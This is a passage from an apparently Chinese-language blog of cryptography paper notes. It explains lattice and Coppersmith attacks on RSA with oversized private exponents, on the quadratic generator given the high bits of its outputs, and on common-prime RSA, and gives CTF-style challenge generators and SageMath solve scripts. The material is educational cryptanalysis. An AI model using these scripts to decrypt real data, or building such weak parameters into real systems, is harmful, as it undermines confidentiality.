class="number">3704855880199540844684471393029778120200002813949971360136836003907617079514427255259825490435790649664138871845360184183073872646513192202430710533078190575826155713068744709583570510772621029194153863144755360680033314134935729641409858927102852838393218895739195668535274536709281331345175528259157861065616063566929061511075538144994303970324882263003736862014947891493045792994888813518254951107205150366762567709160899275278290082623427916958936685063542070448203429654262629010495931973366595478108454303001166436472657033875639872107526273894029423116895670271482208759223339472443202529003559834010956579057550304035996781556930209533455218170729774110756890067380613398785135178534351816918723620913751308520437964511223695725422274481239326850229034260356127594295167293900845312931038087669377326174835490892683438456026242621938736672798206106255717837124241306665260390927662990617721108445864168564068679774771</span></span><br><span class="line">e = <span class="number">2579271279819129677259661444954914000666072869502638373178980948909533424491832236497960827501329860971550060261378562191167092003892029187217381648251227209888222865583154715494119051077991070639878344492936557614415646110493087019450502958684873800502915439789785744551138568723038978413155958712745053980751008235098250055536659575134228336501115649317438024973918535888256664343043528978069590120756670547012670694337838043731922729678149498449241644086246379410101777117264609059232085810975637823706717665777393995734136770737808127271624662132723654664822386827312049691647353315441193716937609509086747665203779389877231389093990180442621437624902437317786590413644715855729798317961116164135452594427839159636091052187175465636699712792431603669274508449578839043435909733404572369414375558622851009282814010908190673544245027388000734293296785729220989948292158236508597861682409318312771683238002694678886507726643</span></span><br><span class="line">c = <span class="number">3321686527839713784281865320915365186718914426372568147226900747934424971609058886767014657335201345693492402124153235870441581968989563743036987489869498147727995690110276112315627325751032107869571604209331406287257146070688086796985083077377983705501489461748053735715624625817539346814955089793502069052665237244440977377005202916595947645638697290341675939891343898336630496335003367142808068651997452238677604659776704436577439714366690375503750042702564409830282153015593741953197055210539798623447872923368458885335754145632598677560334295170950292271778808409691306757984287954611672331937918629091327502408673578690882770895863804939832868557899024008087584937528465704630770511022284926855620785655746708574591891203804095283687857736371538546085029132573864729037118939569119738784797269530709999308262444690199676954172291287762192926122627438851327047378271070528913534458191137543045842937033303998948036956961</span></span><br><span class="line"></span><br><span class="line">P = Zmod(ZZ(e))[<span class="string">&quot;k,s&quot;</span>]</span><br><span class="line">k, s = P.gens()</span><br><span class="line">f = <span class="number">1</span> + k * (n - s)</span><br><span class="line">rs = small_roots(f, (<span class="number">2</span>**<span class="number">490</span>, <span class="number">2</span>**<span class="number">2050</span>), m=<span class="number">4</span>, d=<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(rs)</span><br><span class="line">k, s = <span class="built_in">map</span>(<span class="built_in">int</span>, rs[<span class="number">0</span>])</span><br><span class="line">phi = n - s</span><br><span class="line">d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="1-5-总结"><a href="#1-5-总结" class="headerlink" title="1.5 总结"></a>1.5 总结</h2><p>RSA私钥指数过大会导致与私钥指数过小一样不安全。特别的，对于RSA，私钥指数 $|d|&lt;N^{1&#x2F;4}\sqrt 6$ 与 $|d|&lt; N^{0.292}$ 都会带来不安全性。</p><h1 id="0x02-二次生成器的密码分析"><a href="#0x02-二次生成器的密码分析" class="headerlink" title="0x02 二次生成器的密码分析"></a>0x02 二次生成器的密码分析</h1><p><a href="https://github.com/AL3XEI709/papers/blob/main/Cryptanalysis_of_the_Quadratic_Generator.pdf">Link</a></p><blockquote><p>令 $p$ 为素数，$a,c$ 为模 $p$ 有限域内的整数。<strong>二次生成器</strong> (QCG) 是一个由等式关系 $v_{n+1}&#x3D;av_n^2+c\mod p$ 构成的伪随机数序列 $(v_n)$ 。这篇论文展示了如果任意多个连续的 $v_n$ 的<strong>高位已知</strong>，就可以在多项式时间内<strong>还原初始变量</strong> $v_0$ (即使在参数 $c$ 未知的情况下)，前提是初始变量 $v_0$ 不在某些特殊值的小的子集里。</p></blockquote><h2 id="2-1-二次生成器"><a href="#2-1-二次生成器" class="headerlink" title="2.1 二次生成器"></a>2.1 二次生成器</h2><p>令 $p$ 为素数，$a,c$ 为模 $p$ 有限域内的整数。<strong>二次生成器</strong> (QCG) 是一个由等式关系 $v_{n+1}&#x3D;av_n^2+c\mod p$ 构成的伪随机数序列 $(v_n)$ 。等式中的 $a, c$​ 分别被称为乘子和偏移量。</p><p>在密码设置中，初始量 $v_0$ 以及常量 $a, c$ 应该被设为私钥，利用生成器生成流密码。显然，如果多个连续的 $v_n$ 已知，求得 $v_0,a,c$ 是很容易的。所以在这个设置中，我们只输出 $v_n$ 的最高有效位 (msb) ，希望能让输出的序列更难预测。本篇论文讨论的就是在这种情况下如何预测 $v_{n+j}$ 。</p><p>假设序列 $(v_n)$ 未知，但对于给定的 $n$ ，一些近似值 $w_j$ 已知。以下分别讨论 $a,c$ 公开和 $a$ 公开，$c$ 不公开的两种情况下，如果 $w_j$ 条件足够好，$v_{n+j}$ 和 $a$ 就能在多项式内还原。</p><p>在开始前，还要定义一个参数 $\Delta$ ，用来衡量 $w_j$ 近似 $v_{n+j}$ 的程度。这个参数通常假设为 $\Delta &lt; p$ 。更确切地，$w$ 是 $u$ 的 $\Delta$ - 近似，等价于 $|w-u|&lt;\Delta$ 。</p><h2 id="2-2-乘子与偏移量已知，预测二次生成器"><a href="#2-2-乘子与偏移量已知，预测二次生成器" class="headerlink" title="2.2 乘子与偏移量已知，预测二次生成器"></a>2.2 乘子与偏移量已知，预测二次生成器</h2><p><strong>定理1.</strong> 令 $p$ 为素数，$\Delta$ 为 整数且 $p&gt;\Delta&gt;1$ 。对任意 $a, c\in F_p $ ，存在一个算法，当 $a,c$ 与二次生成器产生的两个连续的值 $v_0,v_1$  $\Delta$-近似的 $w_0,w_1$ 已知时，在多项式时间内返回 $v_0$ 的值。</p><p>令 $\varepsilon_j&#x3D;v_j-w_j,j&#x3D;0,1$ 。由 $v_1\equiv av_0^2+c\mod p$ ，可得<br>$$<br>w_1+\varepsilon_1-a(w_0+\varepsilon_0)^2-c\equiv0\mod p<br>$$<br>令<br>$$<br>A\equiv(w_1-aw_0^2-c)\mod p, \qquad B_1\equiv-2aw_0\Delta\mod p,\<br>B_2\equiv\Delta\mod p,\qquad C\equiv-a\Delta^2\mod p<br>$$<br>可得<br>$$<br>A\Delta^2+B_1\Delta\varepsilon_0+B_2\Delta\varepsilon_1+C\varepsilon_0^2\equiv0\mod p<br>$$<br>因此由同余式<br>$$<br>Ax_0+B_1x_1+B_2x_2+Cx_3\equiv0\mod p,\<br>x_0\equiv0\mod \Delta^2,\<br>x_1\equiv x_2\equiv0\mod \Delta<br>$$<br>构成的格 $L$ 含有解  $x&#x3D;(x_0,x_1,x_2,x_3)\in ZZ^4$ 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">Bits = <span class="number">512</span></span><br><span class="line">UnKnownBits = <span class="number">146</span> </span><br><span class="line">flag = <span class="string">b&#x27;flag&#123;AL3XEI_FAKE_FLAG&#125;&#x27;</span> </span><br><span class="line"></span><br><span class="line">p = getPrime(Bits) </span><br><span class="line">a, c = [randint(<span class="number">0</span>, p) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&quot;ac&quot;</span>] </span><br><span class="line"></span><br><span class="line">v_0 = bytes_to_long(flag) </span><br><span class="line">v_1 = (a*v_0**<span class="number">2</span>+c)%p </span><br><span class="line">v_2 = (a*v_1**<span class="number">2</span>+c)%p  </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;a = <span class="subst">&#123;a&#125;</span>&quot;</span>) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;p = <span class="subst">&#123;p&#125;</span>&quot;</span>) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;high_v1 = <span class="subst">&#123;v_1&gt;&gt;UnKnownBits&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;high_v2 = <span class="subst">&#123;v_2&gt;&gt;UnKnownBits&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">small_roots</span>(<span class="params">f, bounds, m=<span class="number">1</span>, d=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> d:</span><br><span class="line">        d = f.degree()</span><br><span class="line"></span><br><span class="line">    R = f.base_ring()</span><br><span class="line">    N = R.cardinality()</span><br><span class="line"></span><br><span class="line">    f /= f.coefficients().pop(<span class="number">0</span>)</span><br><span class="line">    f = f.change_ring(ZZ)</span><br><span class="line"></span><br><span class="line">    G = <span class="type">Sequence</span>([], f.parent())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m + <span class="number">1</span>):</span><br><span class="line">        base = N ^ (m - i) * f ^ i</span><br><span class="line">        <span class="keyword">for</span> shifts <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(d), repeat=f.nvariables()):</span><br><span class="line">            g = base * prod(<span class="built_in">map</span>(power, f.variables(), shifts))</span><br><span class="line">            G.append(g)</span><br><span class="line"></span><br><span class="line">    B, monomials = G.coefficient_matrix()</span><br><span class="line">    monomials = vector(monomials)</span><br><span class="line"></span><br><span class="line">    factors = [monomial(*bounds) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials]</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, factor)</span><br><span class="line"></span><br><span class="line">    B = B.dense_matrix().LLL()</span><br><span class="line"></span><br><span class="line">    B = B.change_ring(QQ)</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, <span class="number">1</span> / factor)</span><br><span class="line"></span><br><span class="line">    H = <span class="type">Sequence</span>([], f.parent().change_ring(QQ))</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, B * monomials):</span><br><span class="line">        H.append(h)</span><br><span class="line">        I = H.ideal()</span><br><span class="line">        <span class="keyword">if</span> I.dimension() == -<span class="number">1</span>:</span><br><span class="line">            H.pop()</span><br><span class="line">        <span class="keyword">elif</span> I.dimension() == <span class="number">0</span>:</span><br><span class="line">            roots = []</span><br><span class="line">            <span class="keyword">for</span> root <span class="keyword">in</span> I.variety(ring=ZZ):</span><br><span class="line">                root = <span class="built_in">tuple</span>(R(root[var]) <span class="keyword">for</span> var <span class="keyword">in</span> f.variables())</span><br><span class="line">                roots.append(root)</span><br><span class="line">            <span class="keyword">return</span> roots</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> []</span><br><span class="line">a = </span><br><span class="line">c = </span><br><span class="line">p = </span><br><span class="line">high_v1 = </span><br><span class="line">high_v2 = </span><br><span class="line">PR = Zmod(ZZ(p))[<span class="string">&quot;l1, l2&quot;</span>] </span><br><span class="line">l1, l2 = PR.gens() </span><br><span class="line">f = a*(high_v1*(<span class="number">2</span>^<span class="number">146</span>)+l1)^<span class="number">2</span>+c-(high_v2*(<span class="number">2</span>^<span class="number">146</span>)+l2)</span><br><span class="line">low_v1 = ZZ(small_roots(f, (<span class="number">2</span>^<span class="number">146</span>, <span class="number">2</span>^<span class="number">146</span>), m=<span class="number">3</span>, d=<span class="number">4</span>)[<span class="number">0</span>][<span class="number">0</span>]) </span><br><span class="line"></span><br><span class="line">v_0 = mod(((high_v1*(<span class="number">2</span>^<span class="number">146</span>)+low_v1)-c)*inverse_mod(a, p)%p, p).sqrt() </span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(ZZ(v_0)))</span><br></pre></td></tr></table></figure><h2 id="2-3-乘子已知，偏移量未知，预测二次生成器"><a href="#2-3-乘子已知，偏移量未知，预测二次生成器" class="headerlink" title="2.3 乘子已知，偏移量未知，预测二次生成器"></a>2.3 乘子已知，偏移量未知，预测二次生成器</h2><p><strong>定理2.</strong> 令 $p$ 为素数，$\Delta$ 为 整数且 $p&gt;\Delta&gt;1$ 。对任意 $a, c\in F_p $ ，存在一个算法，当 $a$ 与二次生成器产生的三个连续的值 $v_0,v_1,v_2$  $\Delta$-近似的 $w_0,w_1,w_2$ 已知时，在多项式时间内返回 $v_0$​ 的值。</p><p>令 $v_i&#x3D;w_i+\varepsilon_i,|\varepsilon_i|&lt;\Delta,i&#x3D;0,1,2$ ，且 $av_i^2+c&#x3D;v_{i+1}\mod p,i&#x3D;0,1$ ，可得含已知量 $a,w_i$ 和未知量 $\varepsilon_i$ 的方程：<br>$$<br>(aw_0^2-w_1-aw_1^2+w_2)+2aw_0\varepsilon_0-\<br>(1+2aw_1)\varepsilon_1+\varepsilon_2+a(\varepsilon_0^2-\varepsilon_1^2)\equiv 0\mod p<br>$$<br>向量 $(1,\varepsilon_0,\varepsilon_1,\varepsilon_2,\varepsilon_0^2-\varepsilon1^2 )$ 满足已知的一致性系数。为了使量标更平衡，将上式写作：<br>$$<br>(aw_0^2-w_1-aw_1^2+w_2)\Delta^2+2aw_0\Delta\Delta\varepsilon_0-(1+2aw_1)\Delta\Delta\varepsilon_1+\<br>+\Delta\Delta\varepsilon_2+a\Delta^2(\varepsilon_0^2-\varepsilon_1^2)\equiv0\mod p<br>$$<br>因此由同余式<br>$$<br>(aw_0^2-w_1-aw_1^2+w_2)x_0+2aw_0\Delta x_1-(1+2aw_1)\Delta x_2+\<br>+\Delta x_3+a\Delta^2 x_4\equiv0\mod p,\<br>x_0\equiv0\pmod \Delta^2,\<br>x_1,x_2,x_3\equiv0\mod \Delta<br>$$<br>构成的格 $L$ 含有解 $e&#x3D;(\Delta^2,\Delta\varepsilon_0,\Delta\varepsilon_1,\Delta\varepsilon_2,\varepsilon_0^2-\varepsilon_1^2)\in ZZ^5$ 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">Bits = <span class="number">256</span></span><br><span class="line">UnKnownBits = <span class="number">48</span></span><br><span class="line">flag = <span class="string">b&#x27;flag&#123;AL3XEI_FAKE_FLAG&#125;&#x27;</span> </span><br><span class="line"></span><br><span class="line">p = getPrime(Bits) </span><br><span class="line">a, c = [randint(<span class="number">0</span>, p) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&quot;ac&quot;</span>] </span><br><span class="line">v_0 = bytes_to_long(flag) </span><br><span class="line"><span class="keyword">assert</span> v_0&lt;p</span><br><span class="line">v_1 = (a*v_0**<span class="number">2</span>+c)%p </span><br><span class="line">v_2 = (a*v_1**<span class="number">2</span>+c)%p  </span><br><span class="line">v_3 = (a*v_2**<span class="number">2</span>+c)%p  </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;a = <span class="subst">&#123;a&#125;</span>&quot;</span>) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;p = <span class="subst">&#123;p&#125;</span>&quot;</span>) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;high_v0 = <span class="subst">&#123;v_1&gt;&gt;UnKnownBits&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;high_v1 = <span class="subst">&#123;v_2&gt;&gt;UnKnownBits&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;high_v2 = <span class="subst">&#123;v_3&gt;&gt;UnKnownBits&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">small_roots</span>(<span class="params">f, bounds, m=<span class="number">1</span>, d=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> d:</span><br><span class="line">        d = f.degree()</span><br><span class="line"></span><br><span class="line">    R = f.base_ring()</span><br><span class="line">    N = R.cardinality()</span><br><span class="line"></span><br><span class="line">    f /= f.coefficients().pop(<span class="number">0</span>)</span><br><span class="line">    f = f.change_ring(ZZ)</span><br><span class="line"></span><br><span class="line">    G = <span class="type">Sequence</span>([], f.parent())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m + <span class="number">1</span>):</span><br><span class="line">        base = N ^ (m - i) * f ^ i</span><br><span class="line">        <span class="keyword">for</span> shifts <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(d), repeat=f.nvariables()):</span><br><span class="line">            g = base * prod(<span class="built_in">map</span>(power, f.variables(), shifts))</span><br><span class="line">            G.append(g)</span><br><span class="line"></span><br><span class="line">    B, monomials = G.coefficient_matrix()</span><br><span class="line">    monomials = vector(monomials)</span><br><span class="line"></span><br><span class="line">    factors = [monomial(*bounds) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials]</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, factor)</span><br><span class="line"></span><br><span class="line">    B = B.dense_matrix().LLL()</span><br><span class="line"></span><br><span class="line">    B = B.change_ring(QQ)</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, <span class="number">1</span> / factor)</span><br><span class="line"></span><br><span class="line">    H = <span class="type">Sequence</span>([], f.parent().change_ring(QQ))</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, B * monomials):</span><br><span class="line">        H.append(h)</span><br><span class="line">        I = H.ideal()</span><br><span class="line">        <span class="keyword">if</span> I.dimension() == -<span class="number">1</span>:</span><br><span class="line">            H.pop()</span><br><span class="line">        <span class="keyword">elif</span> I.dimension() == <span class="number">0</span>:</span><br><span class="line">            roots = []</span><br><span class="line">            <span class="keyword">for</span> root <span class="keyword">in</span> I.variety(ring=ZZ):</span><br><span class="line">                root = <span class="built_in">tuple</span>(R(root[var]) <span class="keyword">for</span> var <span class="keyword">in</span> f.variables())</span><br><span class="line">                roots.append(root)</span><br><span class="line">            <span class="keyword">return</span> roots</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line">UnKnownBits = <span class="number">48</span></span><br><span class="line">a = </span><br><span class="line">p = </span><br><span class="line">high_v0 = </span><br><span class="line">high_v1 = </span><br><span class="line">high_v2 = </span><br><span class="line"></span><br><span class="line">high_v0 = high_v0&lt;&lt;UnKnownBits</span><br><span class="line">high_v1 = high_v1&lt;&lt;UnKnownBits</span><br><span class="line">high_v2 = high_v2&lt;&lt;UnKnownBits</span><br><span class="line"></span><br><span class="line">PR = Zmod(ZZ(p))[<span class="string">&quot;l0, l1, l2&quot;</span>] </span><br><span class="line">l0, l1, l2 = PR.gens() </span><br><span class="line">f =( a*high_v0^<span class="number">2</span>-high_v1-a*high_v1^<span class="number">2</span>+high_v2 ) + <span class="number">2</span>*a*high_v0*l0 - (<span class="number">1</span>+<span class="number">2</span>*a*high_v1)*l1 + l2 + a*(l0^<span class="number">2</span>-l1^<span class="number">2</span>) </span><br><span class="line"></span><br><span class="line">ls = small_roots(f, (<span class="number">2</span>^UnKnownBits, <span class="number">2</span>^UnKnownBits, <span class="number">2</span>^UnKnownBits), m=<span class="number">3</span>, d=<span class="number">4</span>)</span><br><span class="line">v_0, v_1, v_2 = high_v0+ZZ(ls[<span class="number">0</span>][<span class="number">0</span>]), high_v1+ZZ(ls[<span class="number">0</span>][<span class="number">1</span>]), high_v2+ZZ(ls[<span class="number">0</span>][<span class="number">2</span>]) </span><br><span class="line">c = (v_1 - a*v_0^<span class="number">2</span>) </span><br><span class="line"></span><br><span class="line">sd = mod((v_0-c)*inverse_mod(a, p)%p, p).sqrt() </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(ZZ(sd)))</span><br></pre></td></tr></table></figure><h2 id="2-4-总结-尚未解决的问题"><a href="#2-4-总结-尚未解决的问题" class="headerlink" title="2.4 总结 &amp; 尚未解决的问题"></a>2.4 总结 &amp; 尚未解决的问题</h2><p>显然定理1的界 $\Delta&#x3D;O(p^{1&#x2F;4})$ ，定理2的界 $\Delta&#x3D;O(p^{1&#x2F;5})$ 。因此是否能提高 $\Delta$​ 的界值得讨论。</p><p>在 $c$ 给出但乘子 $a$ 未知的条件下也能用类似的过程预测二次生成器。</p><p>目前还不清楚当模数 $p$ 未知时如何预测二次生成器。</p><h1 id="0x03-在攻击变体-RSA-中找到具有新应用的多元多项式根的策略"><a href="#0x03-在攻击变体-RSA-中找到具有新应用的多元多项式根的策略" class="headerlink" title="0x03 在攻击变体 RSA 中找到具有新应用的多元多项式根的策略"></a>0x03 在攻击变体 RSA 中找到具有新应用的多元多项式根的策略</h1><p><a href="https://github.com/AL3XEI709/papers/blob/main/jochemszmay.pdf">Link</a></p><blockquote><p>这篇论文描述了利用<strong>格基 Coppersmith</strong> 技术计算多元模多项式<strong>小整数根</strong>的策略。应用该策略，该论文得出在多项式时间内攻击两种 <strong>RSA 变体</strong>的方法。首先是 Qiao-Lam scheme, 其利用中国剩余定理在解密过程发挥作用。然后是共素数 RSA ，其素数生成的方法能抵抗 Wiener 攻击。</p></blockquote><h2 id="1-1-jochemsz-may-方法"><a href="#1-1-jochemsz-may-方法" class="headerlink" title="1.1 jochemsz_may 方法"></a>1.1 jochemsz_may 方法</h2><p>论文开篇回顾了了 Coppersmith 以及 boneh Durfee 基于 Coppersmith 设计的针对 RSA 的攻击，并指出：找到一个小根的多项式 $f$ 的分析严重依赖于 $f$ 中出现的单项式，因此每个新的多项式都必须重新进行分析。这个工作无疑是十分繁杂的。2005年，Blomer 和 May 展示了如何寻找二元多项式小整数根的最佳界限。在本文中，我们提出了一种启发式策略，适用于所有多元多项式；无论是具有模数根还是整数根。</p><h2 id="1-2-参数的设定"><a href="#1-2-参数的设定" class="headerlink" title="1.2 参数的设定"></a>1.2 参数的设定</h2><p>令多项式 $f(x,ym,z)&#x3D;a_0+a_1x+a_2x^2+a_3y+a_4z+a_5xy+a_6xz+a_7yz$ 有小根 $(x^0,y^0,z^0)$ ，$x,y,z$ 的上界分别为 $X,Y,Z$ 。根据论文提出的新策略，所有小根都能有效的在多项式时间 $logW$ 内恢复出来，前提是满足<br>$$<br>X^{(7+8\tau+3\tau^2)}(YZ)^{5+\frac{9}{2}\tau}&lt;W^{3+3\tau-\epsilon}<br>$$<br>同时，论文明确给出 $W&#x3D;||f(x_1X_n,\dots,x_nX_n)||<em>\infty$ ，而 $||f(x_1,\dots,x_n)||</em>{\infty}$ 的意思就是多项式的最大系数，所以 $W$ 就是多项式对各 $x$ 进行 $Xx$ 代入后的最大系数。举个例子，如 $f&#x3D;2x^2+3x+4$ ， $X&#x3D;2$ ，则 $||f(x_1X_n,\dots,x_nX_n)||&#x3D;8x^2+6x+4$ ，显然最大系数在 $x^2$ ，即 $W&#x3D;8$ 。</p><h2 id="1-3-对-共素-RSA-的攻击"><a href="#1-3-对-共素-RSA-的攻击" class="headerlink" title="1.3 对 共素 RSA 的攻击"></a>1.3 对 共素 RSA 的攻击</h2><p><strong>定理1.</strong> 对任意 $\epsilon&gt;0$ , 存在 $n$ 使以下成立：令$N&#x3D;pq$ 为 $n$ 比特 的 RSA 模数，$p,q$ 为 $\frac{n}{2}$ 比特的素数，且 $p-1&#x3D;2ga,q-1&#x3D;2gb$ , $g$ 位数为 $\gamma n$ ，$0&lt;\gamma&lt;\frac{1}{2}$ 。令 $ed\equiv1\mod {2gab}$ , $bitsize(e)&#x3D;(1-\gamma)n,bitsize(d)&#x3D;\delta n$ , 其中 $0&lt;\delta&lt;(1-\gamma n)$ , 则 $d$ 可以在<br>$$<br>\delta&lt;\frac{1}{4}(4+4\gamma-\sqrt{13+20\gamma+4\gamma^2})-\epsilon<br>$$<br>的前提下，在多项式时间  $\log N$ 时间内求出。</p><p>由上式可得：<br>$$<br>ed&#x3D;1+k(p-1)b,ed&#x3D;1+k(q-1)a<br>$$<br>联立两个式子：$e^2d^2+ed(ka+kb-2)-(N-1)k^2ab-(ka+kb-1)&#x3D;0$ 。这个方程也可以写成 $f(x,y,z)&#x3D;e^2x^2+ex(y+z-2)-(y+z-1)z-(N-1)yz$ , 它的小根为 $(d,ka,kb)$ , 上界为 $X&#x3D;N^\delta,Y&#x3D;N^{\delta+\frac{1}{2}-\gamma},Z&#x3D;N^{\delta+\frac{1}{2}-\gamma}$ 。同时也可以算出 $W&#x3D;N^{2+2\gamma-2\delta}$  。</p><p>论文给出了几个实现攻击需要的参数列表。</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202403031656231.png" alt="image-20240303165643981"> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 